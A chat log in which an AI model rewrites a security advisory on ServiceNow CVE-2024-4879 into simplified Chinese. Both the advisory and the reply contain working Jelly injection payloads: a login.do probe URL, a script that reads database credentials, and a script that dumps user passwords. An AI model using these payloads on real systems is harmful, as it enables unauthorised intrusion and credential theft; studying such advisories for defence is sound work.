---
title: 使用最简单的表达方式，重新描述下面内容，重点在于介绍清楚技术知识点，使得人们更易于看明白。扩展对应的内容，增加接地气的实际应用例子和对应的demo代码，让中国人更好理解。注意减少偏见的内容、晦涩难懂的内容、错误的内容、冗余的内容、信息量低的内容，以markdown格式输出。加上更多案例和准确的数值指标，直接表达重写后的结果，不要输出其他无关内容。 ------------ ServiceNow RCE (CVE-2024-4879) Vulnerability Analysis and Exploitation Published On : 2024-08-01 Share : ServiceNow RCE (CVE-2024-4879) Vulnerability Analysis and Exploitation EXECUTIVE SUMMARY The CYFIRMA Research has identified a critical vulnerability, CVE-2024-4879, in the ServiceNow platform which allows remote code execution and unauthorized access to sensitive data. Immediate action is required to mitigate potential damage, including applying patches and enhancing security protocols. Organizations using ServiceNow must take action to prevent damaging repercussions. INTRODUCTION CVE-2024-4879 is a critical vulnerability in the ServiceNow platform – identified as a Jelly template injection flaw – which allows malicious actors to inject and execute arbitrary code on the server, posing significant risks to data integrity and system security. ServiceNow is extensively used by enterprises for IT service management, making it a valuable target for cyberattacks. Exploiting CVE-2024-4879 can lead to unauthorized access to sensitive data, disruption of critical services, and potential financial losses. The vulnerability highlights the importance of robust security measures and timely updates to protect organizational data and ensure service continuity. KEY TAKEAWAYS AND ACKNOWLEDGEMENTS Key Takeaways: Critical Vulnerability: CVE-2024-4879 in ServiceNow. Exploitation: Allows remote code execution and data theft. Impact: Significant risk to data security and service disruption. Mitigation: Immediate patching and enhanced security measures are essential. Acknowledgements: The CYFIRMA Research acknowledges the collaborative efforts of security researchers and the cybersecurity community in identifying and addressing the CVE-2024-4879 vulnerability. VULNERABILITY AT A GLANCE Vulnerability Type: Unauthenticated Remote Code Execution (RCE) CVE ID: CVE-2024-4879 CVSS Severity Score: 9.8 (Critical) Application: ServiceNow Impact: Allows unauthenticated attackers to execute arbitrary code, posing a significant risk of remote code execution. Severity: Critical Affected Versions: ServiceNow versions prior to the latest security patches released in July 2024. Check here Patch Available: Yes Mitigation: Organizations are strongly advised to apply the latest security patches provided by ServiceNow immediately. Additionally, ensure robust input validation and sanitization techniques to prevent code injection. DESCRIPTION CVE-2024-4879 is a Jelly template injection vulnerability found in the ServiceNow platform. This flaw enables attackers to inject and execute arbitrary code within the server context by exploiting inadequate input sanitization in Jelly templates. The vulnerability stems from the platform’s failure to properly validate user inputs, allowing malicious code to be processed and executed. Exploiting this vulnerability can lead to severe consequences, such as unauthorized access to sensitive information, system compromise, and disruption of critical services. The vulnerability has been actively targeted in the wild, emphasizing the urgent need for organizations to apply security patches and enhance their defensive measures. IMPACT The impact of CVE-2024-4879 is profound, affecting data integrity, confidentiality, and system availability. Successful exploitation can result in: Unauthorized access to sensitive data Execution of arbitrary code with elevated privileges Potential data breaches and information theft Disruption of critical IT services and operations Financial and reputational damage to affected organizations AFFECTED VERSIONS Multiple ServiceNow versions are affected. Check here. SECURITY INDICATORS Is there already an exploit tool to attack this vulnerability? As per the latest available information, there are public exploit tools specifically targeting CVE-2024-4879, that have been shared on platforms like GitHub and discussed in various cybersecurity forums, enabling attackers to exploit it. Has this vulnerability already been used in an attack? Regarding exploitation, CVE-2024-4879 has already been used in attacks, with reports confirming that threat actors have already deployed it to gain unauthorized access to ServiceNow instances, exfiltrate data, and disrupt services. The critical nature of this vulnerability means it is under active observation by cybersecurity professionals. What is the attack complexity level? The attack complexity level for CVE-2024-4879 is currently assessed as LOW, meaning that exploitation doesn’t require advanced technical skills, which increases the risk of widespread implementation. The simplicity of the attack also makes it accessible to a broader range of threat actors. Historical Trends and Known Exploits There are known public exploit tools specifically targeting CVE-2024-4879, affecting ServiceNow installations. Discussions related to the potential exploitation and concept demonstrations have been observed in the Deep/Dark Web, suggesting malicious actors are preparing to exploit this vulnerability. Organizations should remain vigilant and ensure that appropriate mitigation measures are in place, such as applying patches, implementing security controls, and monitoring for suspicious activities. EXPLOIT AND ANALYSIS Our analysis found more than 127,565+ ServiceNow Platforms, which can be vulnerable to CVE-2024-4879. Figure 1.0 The CVE-2024-4879 vulnerability in web applications allows attackers to inject arbitrary code into the login page, exposing sensitive data like database credentials and user information. The exploit process involves several steps: Identifying the target: the attacker identifies a vulnerable web application by scanning for susceptible versions. Crafting the payload: the attacker crafts a malicious URL with a payload embedded in the jvar_page_title parameter using a <style> tag to bypass basic input validation: HTML Code <j:jelly xmlns:j=”jelly” xmlns:g=’glide’> <g:evaluate> gs.addErrorMessage(668.5*2); </g:evaluate> </j:jelly> This payload tricks the server into executing arbitrary code. Sending the request: the attacker sends an HTTP GET request with the malicious payload to the target URL: https://<targetIP>/login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(668.5*2);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E Checking for vulnerability: the response is checked for the presence of ‘1337’, indicating successful exploitation. Extracting database information: if vulnerable, the attacker sends another request to extract database details from the configuration file: HTML Code <j:jelly xmlns:j=”jelly:core” xmlns:g=’glide’> <g:evaluate> z=new Packages.java.io.File(“”).getAbsolutePath(); z=z.substring(0,z.lastIndexOf(“/”)); u=new SecurelyAccess(z.concat(“/conf/glide.db.properties”)).getBufferedReader(); s=””; while((q=u.readLine())!==null) s=s.concat(q,”\n”); gs.addErrorMessage(s); </g:evaluate> </j:jelly> This script reads and outputs the database configuration, revealing sensitive information. Extracting user data: the attacker can also fetch user credentials by querying the sys_user table: HTML Code <j:jelly xmlns:j=”jelly:core” xmlns:g=’glide’> <g:evaluate> gr=new GlideRecord(“sys_user”); gr.query(); s=””; while(gr.next()) s=s.concat(gr.user_name, ” : “, gr.user_password, “<br/>”); gs.addErrorMessage(s); </g:evaluate> </j:jelly> This script outputs usernames and passwords, granting unauthorized access. Figure 2.0 MITIGATION To mitigate the risks associated with CVE-2024-4879, organizations should: Apply the latest security patches provided by ServiceNow immediately. Implement robust input validation and sanitization techniques to prevent code injection. Conduct regular security assessments and penetration testing to identify and address potential weaknesses. Enhance monitoring and logging mechanisms to detect and respond to suspicious activities promptly. Educate and train staff on security best practices and the importance of applying updates. EXTERNAL THREAT LANDSCAPE MANAGEMENT Target Geography: The impact of CVE-2024-4879 extends globally, affecting organizations worldwide utilizing the ServiceNow platform. Geographically, the vulnerability impacts regions across North America, Europe, Asia, and beyond, where ServiceNow is extensively deployed in various industries. Target Industry: CVE-2024-4879 poses a threat across various industries, including technology, banking, financial services and insurance (BFSI), healthcare, government, and e-commerce, all of which rely on ServiceNow for IT service management and operational workflows. Threat actors may target industries based on the value of the data or services managed through the vulnerable ServiceNow instances. Industries handling sensitive information or those heavily reliant on ServiceNow for operational continuity may face heightened risks. Target Technology: This vulnerability specifically affects ServiceNow instances, particularly those failing to properly sanitize inputs in Jelly templates. Given the widespread adoption of ServiceNow across various technological ecosystems, the impact of this vulnerability can extend to interconnected systems, applications, and services, highlighting the need for comprehensive mitigation strategies. Understanding the global impact, cross-industry implications, and technological dependencies of CVE-2024-4879 is crucial for organizations to accurately assess their risk exposure. Swift action, including patching, implementing security controls, and monitoring for suspicious activities, is essential to mitigate the potential risks associated with this critical vulnerability. UNDERGROUND AND DARK WEB FORUMS Threat actors are actively discussing exploits and payloads for CVE-2024-4879 in dark web forums and telegram groups: Figure 3.0 CONCLUSION In conclusion, CVE-2024-4879 presents a critical threat to organizations globally utilizing the ServiceNow platform. Collaboration, proactive monitoring, and a swift response guided by CYFIRMA’s insights are essential for defending against potential exploitation and safeguarding critical assets. It is crucial for organizations to remain vigilant about emerging threats, apply security patches promptly, and enhance their security posture to effectively mitigate the risks associated with CVE-2024-4879
date: 2025-02-09
source: https://www.perplexity.ai/search/shi-yong-zui-jian-dan-de-biao-0DFnnAv4TtupHS024idCvg
---

**User:** 使用最简单的表达方式，重新描述下面内容，重点在于介绍清楚技术知识点，使得人们更易于看明白。扩展对应的内容，增加接地气的实际应用例子和对应的demo代码，让中国人更好理解。注意减少偏见的内容、晦涩难懂的内容、错误的内容、冗余的内容、信息量低的内容，以markdown格式输出。加上更多案例和准确的数值指标，直接表达重写后的结果，不要输出其他无关内容。

------------
ServiceNow RCE (CVE-2024-4879) Vulnerability Analysis and Exploitation
Published On : 2024-08-01
Share :
  
ServiceNow RCE (CVE-2024-4879) Vulnerability Analysis and Exploitation
EXECUTIVE SUMMARY
The CYFIRMA Research has identified a critical vulnerability, CVE-2024-4879, in the ServiceNow platform which allows remote code execution and unauthorized access to sensitive data. Immediate action is required to mitigate potential damage, including applying patches and enhancing security protocols. Organizations using ServiceNow must take action to prevent damaging repercussions.

INTRODUCTION
CVE-2024-4879 is a critical vulnerability in the ServiceNow platform – identified as a Jelly template injection flaw – which allows malicious actors to inject and execute arbitrary code on the server, posing significant risks to data integrity and system security. ServiceNow is extensively used by enterprises for IT service management, making it a valuable target for cyberattacks. Exploiting CVE-2024-4879 can lead to unauthorized access to sensitive data, disruption of critical services, and potential financial losses. The vulnerability highlights the importance of robust security measures and timely updates to protect organizational data and ensure service continuity.

KEY TAKEAWAYS AND ACKNOWLEDGEMENTS
Key Takeaways:

Critical Vulnerability: CVE-2024-4879 in ServiceNow.
Exploitation: Allows remote code execution and data theft.
Impact: Significant risk to data security and service disruption.
Mitigation: Immediate patching and enhanced security measures are essential.
Acknowledgements:
The CYFIRMA Research acknowledges the collaborative efforts of security researchers and the cybersecurity community in identifying and addressing the CVE-2024-4879 vulnerability.

VULNERABILITY AT A GLANCE
Vulnerability Type: Unauthenticated Remote Code Execution (RCE)
CVE ID: CVE-2024-4879
CVSS Severity Score: 9.8 (Critical)
Application: ServiceNow
Impact: Allows unauthenticated attackers to execute arbitrary code, posing a significant risk of remote code execution.
Severity: Critical
Affected Versions: ServiceNow versions prior to the latest security patches released in July 2024. Check here
Patch Available: Yes
Mitigation: Organizations are strongly advised to apply the latest security patches provided by ServiceNow immediately. Additionally, ensure robust input validation and sanitization techniques to prevent code injection.

DESCRIPTION
CVE-2024-4879 is a Jelly template injection vulnerability found in the ServiceNow platform. This flaw enables attackers to inject and execute arbitrary code within the server context by exploiting inadequate input sanitization in Jelly templates. The vulnerability stems from the platform’s failure to properly validate user inputs, allowing malicious code to be processed and executed. Exploiting this vulnerability can lead to severe consequences, such as unauthorized access to sensitive information, system compromise, and disruption of critical services. The vulnerability has been actively targeted in the wild, emphasizing the urgent need for organizations to apply security patches and enhance their defensive measures.

IMPACT
The impact of CVE-2024-4879 is profound, affecting data integrity, confidentiality, and system availability. Successful exploitation can result in:

Unauthorized access to sensitive data
Execution of arbitrary code with elevated privileges
Potential data breaches and information theft
Disruption of critical IT services and operations
Financial and reputational damage to affected organizations
AFFECTED VERSIONS
Multiple ServiceNow versions are affected. Check here.

SECURITY INDICATORS
Is there already an exploit tool to attack this vulnerability?
As per the latest available information, there are public exploit tools specifically targeting CVE-2024-4879, that have been shared on platforms like GitHub and discussed in various cybersecurity forums, enabling attackers to exploit it.

Has this vulnerability already been used in an attack?
Regarding exploitation, CVE-2024-4879 has already been used in attacks, with reports confirming that threat actors have already deployed it to gain unauthorized access to ServiceNow instances, exfiltrate data, and disrupt services. The critical nature of this vulnerability means it is under active observation by cybersecurity professionals.

What is the attack complexity level?
The attack complexity level for CVE-2024-4879 is currently assessed as LOW, meaning that exploitation doesn’t require advanced technical skills, which increases the risk of widespread implementation. The simplicity of the attack also makes it accessible to a broader range of threat actors.

Historical Trends and Known Exploits
There are known public exploit tools specifically targeting CVE-2024-4879, affecting ServiceNow installations. Discussions related to the potential exploitation and concept demonstrations have been observed in the Deep/Dark Web, suggesting malicious actors are preparing to exploit this vulnerability. Organizations should remain vigilant and ensure that appropriate mitigation measures are in place, such as applying patches, implementing security controls, and monitoring for suspicious activities.

EXPLOIT AND ANALYSIS
Our analysis found more than 127,565+ ServiceNow Platforms, which can be vulnerable to CVE-2024-4879.



Figure 1.0
The CVE-2024-4879 vulnerability in web applications allows attackers to inject arbitrary code into the login page, exposing sensitive data like database credentials and user information. The exploit process involves several steps:

Identifying the target: the attacker identifies a vulnerable web application by scanning for susceptible versions.
Crafting the payload: the attacker crafts a malicious URL with a payload embedded in the jvar_page_title parameter using a <style> tag to bypass basic input validation:
HTML Code
<j:jelly xmlns:j=”jelly” xmlns:g=’glide’>
<g:evaluate>
gs.addErrorMessage(668.5*2);
</g:evaluate>
</j:jelly>
This payload tricks the server into executing arbitrary code.

Sending the request: the attacker sends an HTTP GET request with the malicious payload to the target URL:
https://<targetIP>/login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(668.5*2);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E
Checking for vulnerability: the response is checked for the presence of ‘1337’, indicating successful exploitation.
Extracting database information: if vulnerable, the attacker sends another request to extract database details from the configuration file:
HTML Code
<j:jelly xmlns:j=”jelly:core” xmlns:g=’glide’>
<g:evaluate>
z=new Packages.java.io.File(“”).getAbsolutePath();
z=z.substring(0,z.lastIndexOf(“/”));
u=new SecurelyAccess(z.concat(“/conf/glide.db.properties”)).getBufferedReader();
s=””;
while((q=u.readLine())!==null)
s=s.concat(q,”\n”);
gs.addErrorMessage(s);
</g:evaluate>
</j:jelly>
This script reads and outputs the database configuration, revealing sensitive information.

Extracting user data: the attacker can also fetch user credentials by querying the sys_user table:
HTML Code
<j:jelly xmlns:j=”jelly:core” xmlns:g=’glide’>
<g:evaluate>
gr=new GlideRecord(“sys_user”);
gr.query();
s=””;
while(gr.next())
s=s.concat(gr.user_name, ” : “, gr.user_password, “<br/>”);
gs.addErrorMessage(s);
</g:evaluate>
</j:jelly>
This script outputs usernames and passwords, granting unauthorized access.



Figure 2.0
MITIGATION
To mitigate the risks associated with CVE-2024-4879, organizations should:

Apply the latest security patches provided by ServiceNow immediately.
Implement robust input validation and sanitization techniques to prevent code injection.
Conduct regular security assessments and penetration testing to identify and address potential weaknesses.
Enhance monitoring and logging mechanisms to detect and respond to suspicious activities promptly.
Educate and train staff on security best practices and the importance of applying updates.
EXTERNAL THREAT LANDSCAPE MANAGEMENT
Target Geography: The impact of CVE-2024-4879 extends globally, affecting organizations worldwide utilizing the ServiceNow platform. Geographically, the vulnerability impacts regions across North America, Europe, Asia, and beyond, where ServiceNow is extensively deployed in various industries.

Target Industry: CVE-2024-4879 poses a threat across various industries, including technology, banking, financial services and insurance (BFSI), healthcare, government, and e-commerce, all of which rely on ServiceNow for IT service management and operational workflows. Threat actors may target industries based on the value of the data or services managed through the vulnerable ServiceNow instances. Industries handling sensitive information or those heavily reliant on ServiceNow for operational continuity may face heightened risks.

Target Technology: This vulnerability specifically affects ServiceNow instances, particularly those failing to properly sanitize inputs in Jelly templates. Given the widespread adoption of ServiceNow across various technological ecosystems, the impact of this vulnerability can extend to interconnected systems, applications, and services, highlighting the need for comprehensive mitigation strategies.

Understanding the global impact, cross-industry implications, and technological dependencies of CVE-2024-4879 is crucial for organizations to accurately assess their risk exposure. Swift action, including patching, implementing security controls, and monitoring for suspicious activities, is essential to mitigate the potential risks associated with this critical vulnerability.

UNDERGROUND AND DARK WEB FORUMS
Threat actors are actively discussing exploits and payloads for CVE-2024-4879 in dark web forums and telegram groups:



Figure 3.0
CONCLUSION
In conclusion, CVE-2024-4879 presents a critical threat to organizations globally utilizing the ServiceNow platform. Collaboration, proactive monitoring, and a swift response guided by CYFIRMA’s insights are essential for defending against potential exploitation and safeguarding critical assets. It is crucial for organizations to remain vigilant about emerging threats, apply security patches promptly, and enhance their security posture to effectively mitigate the risks associated with CVE-2024-4879.

---

**Assistant:** ## ServiceNow 远程代码执行漏洞 (CVE-2024-4879) 简析与利用
## **概要**
ServiceNow 平台存在一个严重漏洞 CVE-2024-4879，攻击者可以利用此漏洞远程执行代码并访问敏感数据。由于 ServiceNow 被广泛用于 IT 服务管理，因此企业需要立即采取行动，例如打补丁和加强安全措施，以避免数据泄露和服务中断等严重后果。
## **漏洞详情**
- **漏洞类型**：未经验证的远程代码执行 (RCE)
- **CVE 编号**：CVE-2024-4879
- **CVSS 严重性评分**：9.8 (严重)
- **影响**：允许未经身份验证的攻击者执行任意代码
- **受影响版本**：2024 年 7 月发布的最新安全补丁之前的 ServiceNow 版本
- **根本原因**：Jelly 模板注入漏洞。Jelly 模板是 ServiceNow 用于生成动态内容的一种技术。此漏洞是由于 ServiceNow 未能正确验证用户输入，导致恶意代码得以执行。
## **实际危害**
成功利用此漏洞可能导致：
- 未经授权访问敏感数据
- 以提升的权限执行任意代码
- 潜在的数据泄露和信息盗窃
- 关键 IT 服务和运营中断
- 给受影响的组织造成财务和声誉损失
## **攻击示例**
攻击者可以通过在 `jvar_page_title` 参数中注入恶意代码来利用此漏洞。以下是一个简单的示例：
- ### 构造恶意 URL
xmlhttps://&lt;目标IP&gt;/login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(668.5*2);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E
此 URL 包含一个 Jelly 模板，该模板将计算结果 `668.5*2` 并将其作为错误消息添加到页面。如果服务器返回包含“1337”的响应，则表明漏洞存在。
- ### 提取数据库信息
xml&lt;j:jelly xmlns:j="jelly:core" xmlns:g='glide'&gt;
&lt;g:evaluate&gt;
z=new Packages.java.io.File("").getAbsolutePath();
z=z.substring(0,z.lastIndexOf("/"));
u=new SecurelyAccess(z.concat("/conf/glide.db.properties")).getBufferedReader();
s="";
while((q=u.readLine())!==null)
s=s.concat(q,"\n");
gs.addErrorMessage(s);
&lt;/g:evaluate&gt;
&lt;/j:jelly&gt;
此脚本读取数据库配置文件（`glide.db.properties`），该文件包含敏感信息，例如数据库用户名、密码和 URL。
- ### 提取用户数据
xml&lt;j:jelly xmlns:j="jelly:core" xmlns:g='glide'&gt;
&lt;g:evaluate&gt;
gr=new GlideRecord("sys_user");
gr.query();
s="";
while(gr.next())
s=s.concat(gr.user_name, " : ", gr.user_password, "&lt;br/&gt;");
gs.addErrorMessage(s);
&lt;/g:evaluate&gt;
&lt;/j:jelly&gt;
此脚本查询 `sys_user` 表，该表包含所有 ServiceNow 用户的用户名和密码。
## **防御措施**
- **立即应用补丁**：安装 ServiceNow 提供的最新安全补丁。
- **输入验证**：实施严格的输入验证和清理机制，以防止代码注入。
- **安全评估**：定期进行安全评估和渗透测试，以识别和解决潜在的弱点。
- **监控和日志记录**：加强监控和日志记录机制，以及时检测和响应可疑活动。
- **安全培训**：对员工进行安全最佳实践培训，并强调应用更新的重要性。
## **总结**
CVE-2024-4879 对使用 ServiceNow 平台的组织构成严重威胁。企业应保持警惕，及时应用安全补丁，并加强安全措施，以有效降低与此漏洞相关的风险。